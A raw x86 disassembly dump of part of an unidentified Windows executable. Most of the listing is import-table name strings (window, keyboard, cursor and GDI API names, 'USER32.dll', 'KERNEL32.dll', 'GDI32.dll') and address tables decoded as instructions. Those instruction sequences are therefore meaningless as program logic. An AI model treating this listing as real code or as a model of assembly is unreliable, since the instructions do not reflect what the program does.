  4287e3:	add    BYTE PTR [ecx+0x57734901],ah
  4287e9:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  4287f0:	popa   
  4287f1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4287f5:	add    BYTE PTR ds:0x74654701,dl
  4287fb:	inc    esi
  4287fc:	outs   dx,DWORD PTR ds:[esi]
  4287fd:	jb     0x428864
  4287ff:	addr16 jb 0x428871
  428802:	jne    0x428872
  428804:	fs push edi
  428806:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42880d:	add    DWORD PTR [edi+0x65],eax
  428810:	je     0x428869
  428812:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428819:	js     0x42888f
  42881b:	inc    ecx
  42881c:	add    BYTE PTR [eax],al
  42881e:	add    DWORD PTR ds:[edi+0x65],eax
  428822:	je     0x428871
  428824:	gs jae 0x42889a
  428827:	popa   
  428828:	addr16 gs push edi
  42882b:	add    BYTE PTR [ebx],ch
  42882d:	add    dl,BYTE PTR [ebx+0x65]
  428830:	outs   dx,BYTE PTR ds:[esi]
  428831:	fs dec ebp
  428833:	gs jae 0x4288a9
  428836:	popa   
  428837:	addr16 gs push edi
  42883a:	add    BYTE PTR [eax],al
  42883c:	das    
  42883d:	add    dl,BYTE PTR [ebx+0x65]
  428840:	je     0x428883
  428842:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428846:	gs push edi
  428848:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42884f:	add    dl,BYTE PTR [edx+0x65]
  428852:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42885a:	popa   
  42885b:	jae    0x4288d0
  42885d:	inc    ebp
  42885e:	js     0x4288b7
  428860:	add    BYTE PTR [eax],al
  428862:	and    DWORD PTR [edx],eax
  428864:	push   ebx
  428865:	outs   dx,BYTE PTR gs:[esi]
  428867:	fs inc esp
  428869:	ins    BYTE PTR es:[edi],dx
  42886a:	addr16 dec ecx
  42886c:	je     0x4288d3
  42886e:	ins    DWORD PTR es:[edi],dx
  42886f:	dec    ebp
  428870:	gs jae 0x4288e6
  428873:	popa   
  428874:	addr16 gs inc ecx
  428877:	add    BYTE PTR ds:0x74654701,bh
  42887d:	dec    ebp
  42887e:	gs jae 0x4288f4
  428881:	popa   
  428882:	addr16 gs push esp
  428885:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42888c:	inc    ebx
  42888d:	popa   
  42888e:	jae    0x4288f3
  428890:	popa   
  428891:	fs gs push edi
  428894:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42889b:	add    bh,bl
  42889d:	add    BYTE PTR [ebp+0x78],al
  4288a0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288a8:	jae    0x4288ef
  4288aa:	js     0x4288ac
  4288ac:	repnz add DWORD PTR [eax+0x6f],edx
  4288b0:	jae    0x428926
  4288b2:	dec    ebp
  4288b3:	gs jae 0x428929
  4288b6:	popa   
  4288b7:	addr16 gs push edi
  4288ba:	add    BYTE PTR [eax],al
  4288bc:	add    DWORD PTR fs:[edi+0x65],eax
  4288c0:	je     0x428917
  4288c2:	jo     0x428928
  4288c4:	popa   
  4288c5:	je     0x42892c
  4288c7:	push   edx
  4288c8:	outs   dx,BYTE PTR ds:[si]
  4288ca:	add    BYTE PTR [eax],al
  4288cc:	mov    BYTE PTR [edx],al
  4288ce:	push   esp
  4288cf:	popa   
  4288d0:	bound  esp,QWORD PTR [edx+0x65]
  4288d3:	fs push esp
  4288d5:	gs js  0x42894c
  4288d8:	dec    edi
  4288d9:	jne    0x42894f
  4288db:	push   edi
  4288dc:	add    BYTE PTR [eax],al
  4288de:	test   eax,0x616f4c01
  4288e3:	fs inc edx
  4288e5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  4288ed:	add    BYTE PTR [edx+esi*2+0x61],al
  4288f1:	ja     0x428946
  4288f3:	je     0x428956
  4288f5:	je     0x42895c
  4288f7:	push   edi
  4288f8:	add    BYTE PTR [eax],al
  4288fa:	ja     0x4288fd
  4288fc:	inc    edi
  4288fd:	gs je  0x428957
  428900:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428907:	js     0x42897d
  428909:	dec    esp
  42890a:	outs   dx,BYTE PTR gs:[esi]
  42890c:	addr16 je 0x428977
  42890f:	push   edi
  428910:	add    BYTE PTR [eax],al
  428912:	cmp    BYTE PTR [eax],al
  428914:	inc    ebx
  428915:	push   0x70557261
  42891a:	jo     0x428981
  42891c:	jb     0x428960
  42891e:	jne    0x428986
  428920:	push   di
  428922:	add    BYTE PTR [eax],al
  428924:	daa    
  428925:	add    DWORD PTR [edi+0x65],eax
  428928:	je     0x428975
  42892a:	gs jns 0x42898f
  42892d:	outs   dx,DWORD PTR ds:[esi]
  42892e:	popa   
  42892f:	jb     0x428995
  428931:	push   esp
  428932:	jns    0x4289a4
  428934:	add    BYTE PTR gs:[ebx+0x1],cl
  428938:	inc    edi
  428939:	gs je  0x42898c
  42893c:	jb     0x4289ad
  42893e:	jo     0x428997
  428940:	add    BYTE PTR [eax],al
  428942:	dec    ebp
  428943:	add    BYTE PTR [ebx+0x6f],al
  428946:	jo     0x4289c1
  428948:	push   edx
  428949:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42894e:	sub    eax,0x61684300
  428953:	jb     0x4289a3
  428955:	gs js  0x4289cc
  428958:	push   edi
  428959:	add    BYTE PTR [eax+0x43734901],dl
  42895f:	push   0x6f4c7261
  428964:	ja     0x4289cb
  428966:	jb     0x4289a9
  428968:	add    BYTE PTR [eax],al
  42896a:	sub    BYTE PTR [ecx],al
  42896c:	inc    edi
  42896d:	gs je  0x4289bc
  428970:	popa   
  428971:	jae    0x4289e7
  428973:	inc    ecx
  428974:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428978:	gs push eax
  42897a:	outs   dx,DWORD PTR ds:[esi]
  42897b:	jo     0x4289f2
  42897d:	jo     0x42897f
  42897f:	add    BYTE PTR [ebx+0x616f4c01],bh
  428985:	fs push ebx
  428987:	je     0x4289fb
  428989:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428990:	inc    edi
  428991:	gs je  0x4289eb
  428994:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42899b:	outs   dx,BYTE PTR ds:[esi]
  42899c:	addr16 push edi
  42899e:	add    BYTE PTR [eax],al
  4289a0:	leave  
  4289a1:	add    DWORD PTR [ebp+0x61],ecx
  4289a4:	jo     0x4289fd
  4289a6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289ad:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289b4:	inc    ebx
  4289b5:	push   0x6f547261
  4289ba:	dec    edi
  4289bb:	gs ins DWORD PTR es:[edi],dx
  4289bd:	push   edi
  4289be:	add    BYTE PTR [eax],al
  4289c0:	push   ebp
  4289c1:	push   ebx
  4289c2:	inc    ebp
  4289c3:	push   edx
  4289c4:	xor    esi,DWORD PTR [edx]
  4289c6:	cs fs ins BYTE PTR es:[edi],dx
  4289c9:	ins    BYTE PTR es:[edi],dx
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	xchg   edx,eax
  4289cd:	add    edx,DWORD PTR [edx+0x74]
  4289d0:	ins    BYTE PTR es:[edi],dx
  4289d1:	dec    ecx
  4289d2:	outs   dx,BYTE PTR ds:[esi]
  4289d3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289db:	jb     0x428a46
  4289dd:	outs   dx,BYTE PTR ds:[esi]
  4289de:	add    BYTE PTR [bp+0x74],ch
  4289e2:	fs ins BYTE PTR es:[edi],dx
  4289e4:	ins    BYTE PTR es:[edi],dx
  4289e5:	cs fs ins BYTE PTR es:[edi],dx
  4289e8:	ins    BYTE PTR es:[edi],dx
  4289e9:	add    BYTE PTR ds:0x74654702,al
  4289ef:	dec    esp
  4289f0:	outs   dx,DWORD PTR ds:[esi]
  4289f1:	arpl   WORD PTR [ecx+0x6c],sp
  4289f4:	gs dec ecx
  4289f6:	outs   dx,BYTE PTR ds:[esi]
  4289f7:	outs   dx,WORD PTR ds:[esi]
  4289f9:	push   edi
  4289fa:	add    BYTE PTR [eax],al
  4289fc:	inc    ebp
  4289fd:	add    al,BYTE PTR [edi+0x65]
  428a00:	je     0x428a52
  428a02:	jb     0x428a73
  428a04:	arpl   WORD PTR [ecx+0x64],ax
  428a07:	fs jb  0x428a6f
  428a0a:	jae    0x428a7f
  428a0c:	add    BYTE PTR [eax],al
  428a0e:	rol    DWORD PTR [eax],cl
  428a10:	inc    ebx
  428a11:	jb     0x428a78
  428a13:	popa   
  428a14:	je     0x428a7b
  428a16:	inc    esi
  428a17:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a1f:	outs   dx,BYTE PTR ds:[esi]
  428a20:	addr16 push edi
  428a22:	add    BYTE PTR [eax],al
  428a24:	sub    BYTE PTR [ebx+edx*2],al
  428a27:	gs je  0x428a72
  428a2a:	popa   
  428a2b:	outs   dx,BYTE PTR ds:[esi]
  428a2c:	fs ins BYTE PTR es:[edi],dx
  428a2e:	gs inc ebx
  428a30:	outs   dx,DWORD PTR ds:[esi]
  428a31:	jne    0x428aa1
  428a33:	je     0x428a35
  428a35:	add    ah,bl
  428a37:	add    BYTE PTR [ebx+0x72],al
  428a3a:	gs popa 
  428a3c:	je     0x428aa3
  428a3e:	dec    ebp
  428a3f:	popa   
  428a40:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a48:	pop    DWORD PTR [ecx]
  428a4a:	inc    edi
  428a4b:	gs je  0x428a8f
  428a4e:	je     0x428abf
  428a50:	ins    DWORD PTR es:[edi],dx
  428a51:	dec    esi
  428a52:	popa   
  428a53:	ins    DWORD PTR es:[edi],dx
  428a54:	gs inc ecx
  428a56:	add    BYTE PTR [eax],al
  428a58:	pusha  
  428a59:	add    al,BYTE PTR [edi+0x65]
  428a5c:	je     0x428ab1
  428a5e:	jns    0x428ad3
  428a60:	je     0x428ac7
  428a62:	ins    DWORD PTR es:[edi],dx
  428a63:	push   edi
  428a64:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a6b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a72:	jns    0x428ab5
  428a74:	add    BYTE PTR [eax],al
  428a76:	aas    
  428a77:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a7b:	fs dec esp
  428a7d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428a84:	add    BYTE PTR [eax],al
  428a86:	xchg   ecx,eax
  428a87:	add    al,BYTE PTR [edi+0x6c]
  428a8a:	outs   dx,DWORD PTR ds:[esi]
  428a8b:	bound  esp,QWORD PTR [ecx+0x6c]
  428a8e:	inc    ecx
  428a8f:	ins    BYTE PTR es:[edi],dx
  428a90:	ins    BYTE PTR es:[edi],dx
  428a91:	outs   dx,DWORD PTR ds:[esi]
  428a92:	arpl   WORD PTR [eax],ax
  428a94:	xchg   edx,eax
  428a95:	add    al,0x56
  428a97:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428a9e:	jne    0x428b05
  428aa0:	jb     0x428b1b
  428aa2:	add    BYTE PTR [eax],al
  428aa4:	test   DWORD PTR [ecx],0x46746547
  428aaa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ab2:	jb     0x428ab5
  428ab4:	inc    esi
  428ab5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428abc:	jne    0x428b30
  428abe:	arpl   WORD PTR [ebp+0x57],sp
  428ac1:	add    BYTE PTR [eax],bh
  428ac3:	add    ecx,DWORD PTR [ebp+0x6f]
  428ac6:	jbe    0x428b2d
  428ac8:	inc    esi
  428ac9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428ad1:	popa   
  428ad2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428ad9:	jo     0x428b4f
  428adb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428ae2:	inc    edi
  428ae3:	gs je  0x428b28
  428ae6:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428aed:	jo     0x428b54
  428aef:	inc    ecx
  428af0:	add    BYTE PTR [eax],al
  428af2:	and    DWORD PTR [ebx+edx*2],eax
  428af5:	gs je  0x428b3e
  428af8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b00:	bound  esi,QWORD PTR [ebp+0x74]
  428b03:	gs jae 0x428b47
  428b06:	add    BYTE PTR [eax],al
  428b08:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b0c:	jbe    0x428b73
  428b0e:	inc    esi
  428b0f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b17:	add    BYTE PTR [ebx+0x6f],al
  428b1a:	jo     0x428b95
  428b1c:	inc    esi
  428b1d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b25:	jne    0x428b8c
  428b27:	jb     0x428ba2
  428b29:	push   eax
  428b2a:	gs jb  0x428b93
  428b2d:	outs   dx,DWORD PTR ds:[esi]
  428b2e:	jb     0x428b9d
  428b30:	popa   
  428b31:	outs   dx,BYTE PTR ds:[esi]
  428b32:	arpl   WORD PTR [ebp+0x43],sp
  428b35:	outs   dx,DWORD PTR ds:[esi]
  428b36:	jne    0x428ba6
  428b38:	je     0x428b9f
  428b3a:	jb     0x428b3c
  428b3c:	sub    DWORD PTR [ebx+edx*2],eax
  428b3f:	gs je  0x428b8a
  428b42:	popa   
  428b43:	outs   dx,BYTE PTR ds:[esi]
  428b44:	fs ins BYTE PTR es:[edi],dx
  428b46:	gs dec ecx
  428b48:	outs   dx,BYTE PTR ds:[esi]
  428b49:	outs   dx,WORD PTR ds:[esi]
  428b4b:	jb     0x428bba
  428b4d:	popa   
  428b4e:	je     0x428bb9
  428b50:	outs   dx,DWORD PTR ds:[esi]
  428b51:	outs   dx,BYTE PTR ds:[esi]
  428b52:	add    BYTE PTR [eax],al
  428b54:	push   ss
  428b55:	add    DWORD PTR [ebp+0x6e],eax
  428b58:	je     0x428bbf
  428b5a:	jb     0x428b9f
  428b5c:	jb     0x428bc7
  428b5e:	je     0x428bc9
  428b60:	arpl   WORD PTR [ecx+0x6c],sp
  428b63:	push   ebx
  428b64:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b69:	outs   dx,BYTE PTR ds:[esi]
  428b6a:	add    BYTE PTR [eax],al
  428b6c:	jg     0x428b6f
  428b6e:	inc    esi
  428b6f:	outs   dx,DWORD PTR ds:[esi]
  428b70:	ins    BYTE PTR es:[edi],dx
  428b71:	fs push ebx
  428b73:	je     0x428be7
  428b75:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b7c:	ins    BYTE PTR es:[edi],dx
  428b7d:	jae    0x428bf3
  428b7f:	jb     0x428bed
  428b81:	outs   dx,BYTE PTR gs:[esi]
  428b83:	inc    ecx
  428b84:	add    BYTE PTR [eax],al
  428b86:	sahf   
  428b87:	add    DWORD PTR [edi+0x65],eax
  428b8a:	je     0x428bcf
  428b8c:	outs   dx,DWORD PTR ds:[esi]
  428b8d:	ins    DWORD PTR es:[edi],dx
  428b8e:	ins    DWORD PTR es:[edi],dx
  428b8f:	push   esp
  428b90:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428b97:	add    BYTE PTR [edx+eax*1+0x47],dh
  428b9b:	gs je  0x428bf2
  428b9e:	push   0x64616572
  428ba3:	push   esp
  428ba4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bab:	inc    ebp
  428bac:	push   edx
  428bad:	dec    esi
  428bae:	inc    ebp
  428baf:	dec    esp
  428bb0:	xor    esi,DWORD PTR [edx]
  428bb2:	cs fs ins BYTE PTR es:[edi],dx
  428bb5:	ins    BYTE PTR es:[edi],dx
  428bb6:	add    BYTE PTR [eax],al
  428bb8:	mov    dh,0x1
  428bba:	push   eax
  428bbb:	outs   dx,DWORD PTR ds:[esi]
  428bbc:	ins    BYTE PTR es:[edi],dx
  428bbd:	jns    0x428c26
  428bbf:	outs   dx,DWORD PTR ds:[esi]
  428bc0:	outs   dx,BYTE PTR ds:[esi]
  428bc1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428bc5:	gs je  0x428c17
  428bc8:	bound  ebp,QWORD PTR [edx+0x65]
  428bcb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bcf:	add    BYTE PTR [ebx+0x6c654400],dh
  428bd5:	gs je  0x428c3d
  428bd8:	inc    esp
  428bd9:	inc    ebx
  428bda:	add    BYTE PTR [eax],al
  428bdc:	rol    DWORD PTR [ecx],1
  428bde:	push   ebx
  428bdf:	gs ins BYTE PTR es:[edi],dx
  428be1:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428be6:	push   0x65
  428be8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bec:	jmp    0x428bef
  428bee:	push   ebx
  428bef:	gs je  0x428c3f
  428bf2:	popa   
  428bf3:	jo     0x428c42
  428bf5:	outs   dx,DWORD PTR ds:[esi]
  428bf6:	fs add BYTE PTR gs:[eax],al
  428bfa:	leave  
  428bfb:	add    DWORD PTR [edx+0x6f],edx
  428bfe:	jne    0x428c6e
  428c00:	fs push edx
  428c02:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c07:	add    BYTE PTR [edx+0x69],al
  428c0a:	je     0x428c4e
  428c0c:	ins    BYTE PTR es:[edi],dx
  428c0d:	je     0x428c0f
  428c0f:	add    BYTE PTR [ebx+0x61655201],bh
  428c15:	ins    BYTE PTR es:[edi],dx
  428c16:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c1d:	je     0x428c93
  428c1f:	add    BYTE PTR gs:[eax],al
  428c22:	jge    0x428c25
  428c24:	inc    edi
  428c25:	gs je  0x428c7b
  428c28:	jns    0x428c9d
  428c2a:	je     0x428c91
  428c2c:	ins    DWORD PTR es:[edi],dx
  428c2d:	push   eax
  428c2e:	popa   
  428c2f:	ins    BYTE PTR es:[edi],dx
  428c30:	gs je  0x428ca7
  428c33:	gs push ebp
  428c35:	jae    0x428c9c
  428c37:	add    BYTE PTR [eax+0x74654701],cl
  428c3d:	push   esp
  428c3e:	gs js  0x428cb5
  428c41:	inc    ebp
  428c42:	js     0x428cb8
  428c44:	outs   dx,BYTE PTR gs:[esi]
  428c46:	je     0x428c98
  428c48:	outs   dx,DWORD PTR ds:[esi]
  428c49:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c50:	push   ebx
  428c51:	arpl   WORD PTR [ecx+0x6c],sp
  428c54:	gs push esi
  428c56:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c5d:	inc    ebp
  428c5e:	js     0x428cd4
  428c60:	inc    ebp
  428c61:	js     0x428c63
  428c63:	add    bh,cl
  428c65:	add    DWORD PTR [ebx+0x65],edx
  428c68:	ins    BYTE PTR es:[edi],dx
  428c69:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c6e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c75:	add    DWORD PTR [ebx+0x65],edx
  428c78:	je     0x428cce
  428c7a:	gs js  0x428cf1
  428c7d:	inc    ebx
  428c7e:	outs   dx,DWORD PTR ds:[esi]
  428c7f:	ins    BYTE PTR es:[edi],dx
  428c80:	outs   dx,DWORD PTR ds:[esi]
  428c81:	jb     0x428c83
  428c83:	add    BYTE PTR [eax+0x74615001],ch
  428c89:	push   0x65526f54
  428c8e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428c96:	inc    ebx
  428c97:	outs   dx,DWORD PTR ds:[esi]
  428c98:	ins    DWORD PTR es:[edi],dx
  428c99:	bound  ebp,QWORD PTR [ecx+0x6e]
  428c9c:	gs push edx
  428c9e:	outs   dx,BYTE PTR ds:[si]
  428ca0:	add    BYTE PTR [eax],al
  428ca2:	lods   al,BYTE PTR ds:[esi]
  428ca3:	add    BYTE PTR [ebx+0x72],al
  428ca6:	gs popa 
  428ca8:	je     0x428d0f
  428caa:	push   edx
  428cab:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428cb0:	outs   dx,BYTE PTR ds:[esi]
  428cb1:	dec    ecx
  428cb2:	outs   dx,BYTE PTR ds:[esi]
  428cb3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428cbb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428cbf:	gs push esp
  428cc1:	outs   dx,DWORD PTR ds:[esi]
  428cc2:	add    BYTE PTR [eax],al
  428cc4:	mov    ds:0x65724300,al
  428cc9:	popa   
  428cca:	je     0x428d31
  428ccc:	dec    ecx
  428ccd:	inc    ebx
  428cce:	push   edi
  428ccf:	add    BYTE PTR [ebp+0x63655201],bh
  428cd5:	je     0x428d2d
  428cd7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cdf:	add    BYTE PTR [ebx+0x72],al
  428ce2:	gs popa 
  428ce4:	je     0x428d4b
  428ce6:	push   eax
  428ce7:	popa   
  428ce8:	ins    BYTE PTR es:[edi],dx
  428ce9:	gs je  0x428d60
  428cec:	add    BYTE PTR gs:[edi+0x44],al
  428cf0:	dec    ecx
  428cf1:	xor    esi,DWORD PTR [edx]
  428cf3:	cs fs ins BYTE PTR es:[edi],dx
  428cf6:	ins    BYTE PTR es:[edi],dx
	...
  428cff:	add    BYTE PTR [edx+0x20],al
  428d02:	add    al,BYTE PTR [eax]
	...
  428d20:	cmp    ecx,DWORD PTR [ebp+0x2]
	...
  428d2e:	add    BYTE PTR [eax],al
  428d30:	imul   esp,DWORD PTR [eax+edi*2+0x69],0x632e6f64
  428d38:	outs   dx,DWORD PTR ds:[esi]
  428d39:	ins    DWORD PTR es:[edi],dx
  428d3a:	add    BYTE PTR [ebx+0x65],dl
  428d3d:	je     0x428d80
  428d3f:	outs   dx,BYTE PTR ds:[esi]
  428d40:	arpl   WORD PTR [eax+0x6f],bp
  428d43:	jb     0x428d94
  428d45:	jb     0x428db0
  428d47:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d4f:	add    BYTE PTR [eax],al
  428d51:	add    BYTE PTR [eax],al
  428d53:	add    al,cl
  428d55:	test   DWORD PTR [edx],eax
  428d57:	add    ah,ah
  428d59:	test   DWORD PTR [edx],eax
  428d5b:	add    dh,dh
  428d5d:	test   DWORD PTR [edx],eax
  428d5f:	add    BYTE PTR [eax],cl
  428d61:	xchg   BYTE PTR [edx],al
  428d63:	add    BYTE PTR [eax],ah
  428d65:	xchg   BYTE PTR [edx],al
  428d67:	add    BYTE PTR [esi+eax*4],dh
  428d6a:	add    al,BYTE PTR [eax]
  428d6c:	dec    esi
  428d6d:	xchg   BYTE PTR [edx],al
  428d6f:	add    BYTE PTR [eax],al
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [eax-0x7a],dh
  428d76:	add    al,BYTE PTR [eax]
  428d78:	mov    es,WORD PTR [esi-0x7963fffe]
  428d7e:	add    al,BYTE PTR [eax]
  428d80:	stos   BYTE PTR es:[edi],al
  428d81:	xchg   BYTE PTR [edx],al
  428d83:	add    BYTE PTR [esi-0x33fffd7a],bh
  428d89:	xchg   BYTE PTR [edx],al
  428d8b:	add    dh,bl
  428d8d:	xchg   BYTE PTR [edx],al
  428d8f:	add    al,dh
  428d91:	xchg   BYTE PTR [edx],al
  428d93:	add    dh,bh
  428d95:	xchg   BYTE PTR [edx],al
  428d97:	add    BYTE PTR [eax],dl
  428d99:	xchg   DWORD PTR [edx],eax
  428d9b:	add    BYTE PTR [edx],ah
  428d9d:	xchg   DWORD PTR [edx],eax
  428d9f:	add    BYTE PTR [eax],dh
  428da1:	xchg   DWORD PTR [edx],eax
  428da3:	add    BYTE PTR [esi],bh
  428da5:	xchg   DWORD PTR [edx],eax
  428da7:	add    BYTE PTR [eax-0x79],dl
  428daa:	add    al,BYTE PTR [eax]
  428dac:	pop    esp
  428dad:	xchg   DWORD PTR [edx],eax
  428daf:	add    BYTE PTR [edx-0x79],dh
  428db2:	add    al,BYTE PTR [eax]
  428db4:	test   BYTE PTR [edi-0x7869fffe],al
  428dba:	add    al,BYTE PTR [eax]
  428dbc:	mov    ds:0xb2000287,al
  428dc1:	xchg   DWORD PTR [edx],eax
  428dc3:	add    dl,al
  428dc5:	xchg   DWORD PTR [edx],eax
  428dc7:	add    al,bl
  428dc9:	xchg   DWORD PTR [edx],eax
  428dcb:	add    ah,ah
  428dcd:	xchg   DWORD PTR [edx],eax
  428dcf:	add    dh,dh
  428dd1:	xchg   DWORD PTR [edx],eax
  428dd3:	add    BYTE PTR [eax+ecx*4],cl
  428dd6:	add    al,BYTE PTR [eax]
  428dd8:	push   ds
  428dd9:	mov    BYTE PTR [edx],al
  428ddb:	add    BYTE PTR [eax+ecx*4],ch
  428dde:	add    al,BYTE PTR [eax]
  428de0:	cmp    al,0x88
  428de2:	add    al,BYTE PTR [eax]
  428de4:	dec    esi
  428de5:	mov    BYTE PTR [edx],al
  428de7:	add    BYTE PTR [edx-0x78],ah
  428dea:	add    al,BYTE PTR [eax]
  428dec:	js     0x428d76
  428dee:	add    al,BYTE PTR [eax]
  428df0:	mov    cl,BYTE PTR [eax-0x7763fffe]
  428df6:	add    al,BYTE PTR [eax]
  428df8:	lods   al,BYTE PTR ds:[esi]
  428df9:	mov    BYTE PTR [edx],al
  428dfb:	add    BYTE PTR [eax+ecx*4-0x7733fffe],bh
  428e02:	add    al,BYTE PTR [eax]
  428e04:	fimul  WORD PTR [eax-0x7713fffe]
  428e0a:	add    al,BYTE PTR [eax]
  428e0c:	cli    
  428e0d:	mov    BYTE PTR [edx],al
  428e0f:	add    BYTE PTR [edx],dl
  428e11:	mov    DWORD PTR [edx],eax
  428e13:	add    BYTE PTR [ecx+ecx*4],ah
  428e16:	add    al,BYTE PTR [eax]
  428e18:	mov    DWORD PTR ss:[edx],eax
  428e1b:	add    BYTE PTR [edx-0x77],al
  428e1e:	add    al,BYTE PTR [eax]
  428e20:	dec    esi
  428e21:	mov    DWORD PTR [edx],eax
  428e23:	add    BYTE PTR [edx-0x77],bl
  428e26:	add    al,BYTE PTR [eax]
  428e28:	push   0xffffff89
  428e2a:	add    al,BYTE PTR [eax]
  428e2c:	or     BYTE PTR [ecx-0x7671fffe],0x2
  428e33:	add    BYTE PTR [eax-0x4dfffd77],ah
  428e39:	mov    DWORD PTR [edx],eax
  428e3b:	add    BYTE PTR [eax],al
  428e3d:	add    BYTE PTR [eax],al
  428e3f:	add    ah,cl
  428e41:	mov    DWORD PTR [edx],eax
  428e43:	add    BYTE PTR [eax],al
  428e45:	add    BYTE PTR [eax],al
  428e47:	add    dl,ch
  428e49:	mov    DWORD PTR [edx],eax
  428e4b:	add    ah,bh
  428e4d:	mov    DWORD PTR [edx],eax
  428e4f:	add    BYTE PTR [esi],cl
  428e51:	mov    al,BYTE PTR [edx]
  428e53:	add    BYTE PTR [edx+ecx*4],ah
  428e56:	add    al,BYTE PTR [eax]
  428e58:	mov    al,BYTE PTR ss:[edx]
  428e5b:	add    BYTE PTR [eax-0x76],cl
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	pop    eax
  428e61:	mov    al,BYTE PTR [edx]
  428e63:	add    BYTE PTR [esi-0x76],dh
  428e66:	add    al,BYTE PTR [eax]
  428e68:	xchg   BYTE PTR [edx-0x756bfffe],cl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e71:	mov    al,BYTE PTR [edx]
  428e73:	add    BYTE PTR [edx-0x3dfffd76],dh
  428e79:	mov    al,BYTE PTR [edx]
  428e7b:	add    dh,cl
  428e7d:	mov    al,BYTE PTR [edx]
  428e7f:	add    al,ah
  428e81:	mov    al,BYTE PTR [edx]
  428e83:	add    dl,dh
  428e85:	mov    al,BYTE PTR [edx]
  428e87:	add    BYTE PTR [eax],cl
  428e89:	mov    eax,DWORD PTR [edx]
  428e8b:	add    BYTE PTR [esi],dl
  428e8d:	mov    eax,DWORD PTR [edx]
  428e8f:	add    BYTE PTR [edx],ah
  428e91:	mov    eax,DWORD PTR [edx]
  428e93:	add    BYTE PTR [ebx+ecx*4],bh
  428e96:	add    al,BYTE PTR [eax]
  428e98:	push   esp
  428e99:	mov    eax,DWORD PTR [edx]
  428e9b:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  428e9f:	add    BYTE PTR [edx-0x75],bh
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	xchg   BYTE PTR [ebx-0x7467fffe],cl
  428eaa:	add    al,BYTE PTR [eax]
  428eac:	add    BYTE PTR [eax],al
  428eae:	add    BYTE PTR [eax],al
  428eb0:	mov    eax,0xc200028b
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    al,dl
  428eb9:	mov    eax,DWORD PTR [edx]
  428ebb:	add    ah,bl
  428ebd:	mov    eax,DWORD PTR [edx]
  428ebf:	add    ah,ch
  428ec1:	mov    eax,DWORD PTR [edx]
  428ec3:	add    dl,bh
  428ec5:	mov    eax,DWORD PTR [edx]
  428ec7:	add    BYTE PTR [esi],al
  428ec9:	mov    WORD PTR [edx],es
  428ecb:	add    BYTE PTR [eax],dl
  428ecd:	mov    WORD PTR [edx],es
  428ecf:	add    BYTE PTR [edx],ah
  428ed1:	mov    WORD PTR [edx],es
  428ed3:	add    BYTE PTR [eax],bh
  428ed5:	mov    WORD PTR [edx],es
  428ed7:	add    BYTE PTR [esi-0x74],cl
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    WORD PTR fs:[edx],es
